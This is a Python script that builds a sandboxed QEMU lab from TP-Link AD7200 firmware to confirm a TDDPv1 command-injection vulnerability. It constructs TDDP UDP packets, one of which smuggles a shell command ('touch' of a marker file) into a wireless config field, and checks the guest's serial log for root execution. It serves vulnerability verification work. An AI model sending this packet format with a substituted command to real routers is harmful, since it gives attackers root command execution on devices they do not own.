#!/usr/bin/env python3
"""Build and run an isolated full-system AD7200 TDDPv1 confirmation lab."""

from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
ROOTFS = ROOT / "known_firmware/extracted/60f753419137504b/_AD7200_EU_US__V2.0_210430.zip.extracted/AD7200(EU_US)_V2.0_210430/_AD7200v2-up-ver2-0-2-P1[20210430-rel61094]_2021-05-06_11.48.13.bin.extracted/squashfs-root"
INIT = ROOT / "known_firmware/emulation/TP-Link_AD7200/full_system_init"
UDP_SENDER = ROOT / "known_firmware/emulation/TP-Link_AD7200/send_udp.lua"
LAB = ROOT / "known_firmware/emulation/TP-Link_AD7200/full-system-lab"
STAGING = Path("/tmp/friday-ad7200-full-system-root")
KERNEL = Path("/tmp/ad7200-armmp-vmlinuz")
QEMU = Path("/tmp/qemu-system-arm-local/usr/bin/qemu-system-arm")
KMODS = Path("/tmp/ad7200-kmods/lib/modules")
INITRAMFS = LAB / "ad7200-rootfs.cpio.gz"
SERIAL = LAB / "serial.log"
QEMU_LOG = LAB / "qemu.log"
PIDFILE = LAB / "qemu.pid"
HOST_PORT = 21040


def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, check=True, text=True, **kwargs)


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as source:
        for chunk in iter(lambda: source.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def build() -> None:
    if not ROOTFS.is_dir() or not KERNEL.is_file() or not QEMU.is_file():
        raise SystemExit("missing rootfs, /tmp ARM kernel, or /tmp QEMU system binary")
    LAB.mkdir(parents=True, exist_ok=True)
    shutil.rmtree(STAGING, ignore_errors=True)
    shutil.copytree(ROOTFS, STAGING, symlinks=True)
    if not KMODS.is_dir():
        raise SystemExit("matching ARM kernel modules not found under /tmp/ad7200-kmods")
    shutil.copytree(KMODS, STAGING / "lib/modules", dirs_exist_ok=True)
    shutil.copy2(INIT, STAGING / "init")
    os.chmod(STAGING / "init", 0o755)
    proof = STAGING / "proof"
    proof.mkdir()
    shutil.copy2(UDP_SENDER, proof / "send_udp.lua")
    control_body = b"1 wireless wlan02 ssid FRIDAY_CONTROL \r"
    injection_body = b"1 wireless;touch\t/FRIDAY_AD7200_TDDPV1_ROOT;# wlan02 ssid X \r"
    (proof / "control.packet").write_bytes(packet(control_body, 0x5151))
    (proof / "injection.packet").write_bytes(packet(injection_body, 0x5152))
    for relative in ("proc", "sys", "dev", "run", "tmp"):
        (STAGING / relative).mkdir(exist_ok=True)
    command = (
        f"cd {shlex_quote(str(STAGING))} && "
        f"find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > {shlex_quote(str(INITRAMFS))}"
    )
    subprocess.run(["/bin/sh", "-c", command], check=True)
    print(f"initramfs={INITRAMFS} sha256={sha256(INITRAMFS)}")


def shlex_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def stop() -> None:
    if PIDFILE.exists():
        try:
            pid = int(PIDFILE.read_text().strip())
            cmdline = Path(f"/proc/{pid}/cmdline")
            if cmdline.exists() and b"qemu-system-arm" in cmdline.read_bytes():
                os.kill(pid, 15)
                time.sleep(1)
        except (ValueError, ProcessLookupError, PermissionError):
            pass
        PIDFILE.unlink(missing_ok=True)


def start() -> None:
    stop()
    SERIAL.unlink(missing_ok=True)
    QEMU_LOG.unlink(missing_ok=True)
    command = [
        str(QEMU), "-M", "virt", "-cpu", "cortex-a15", "-m", "512M",
        "-kernel", str(KERNEL), "-initrd", str(INITRAMFS),
        "-append", "console=ttyAMA0 rdinit=/init panic=-1",
        "-nographic", "-monitor", "none", "-serial", f"file:{SERIAL}",
        "-netdev", f"user,id=lan,restrict=on,hostfwd=udp:127.0.0.1:{HOST_PORT}-:1040",
        "-device", "virtio-net-device,netdev=lan", "-no-reboot",
    ]
    qemu_log = QEMU_LOG.open("wb")
    process = subprocess.Popen(command, stdout=qemu_log, stderr=subprocess.STDOUT)
    qemu_log.close()
    PIDFILE.write_text(f"{process.pid}\n")
    print(f"qemu_pid={process.pid} network=user,restrict=on udp=127.0.0.1:{HOST_PORT}->guest:1040")


def wait_for_boot(timeout: float = 90) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        content = SERIAL.read_text(errors="replace") if SERIAL.exists() else ""
        if "TDDP_PID=" in content:
            return
        if "Kernel panic" in content:
            raise RuntimeError("guest kernel panic; inspect serial.log")
        time.sleep(0.5)
    raise TimeoutError("guest did not start TDDP; inspect serial.log")


def packet(body: bytes, packet_id: int) -> bytes:
    return struct.pack(">BBBBIHBB", 1, 0x31, 0, 0, len(body), packet_id, 0, 0) + body


def exchange(body: bytes, packet_id: int) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
        client.settimeout(1)
        client.sendto(packet(body, packet_id), ("127.0.0.1", HOST_PORT))
        try:
            reply, _ = client.recvfrom(2048)
            return reply.hex()
        except socket.timeout:
            return "timeout"


def confirm() -> None:
    wait_for_boot()
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        content = SERIAL.read_text(errors="replace") if SERIAL.exists() else ""
        if "FRIDAY_MARKER_CREATED=" in content:
            print(content)
            if "FRIDAY_MARKER_CREATED=1" not in content or "uid=0" not in content:
                raise SystemExit("marker/root proof absent")
            return
        time.sleep(0.5)
    raise SystemExit("timed out waiting for marker evidence")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("build", "start", "confirm", "test", "run", "stop"))
    args = parser.parse_args()
    if args.action in ("build", "run"):
        build()
    if args.action in ("start", "test", "run"):
        start()
    if args.action in ("confirm", "test", "run"):
        try:
            confirm()
        finally:
            stop()
    if args.action == "stop":
        stop()
    return 0


if __name__ == "__main__":
    sys.exit(main())
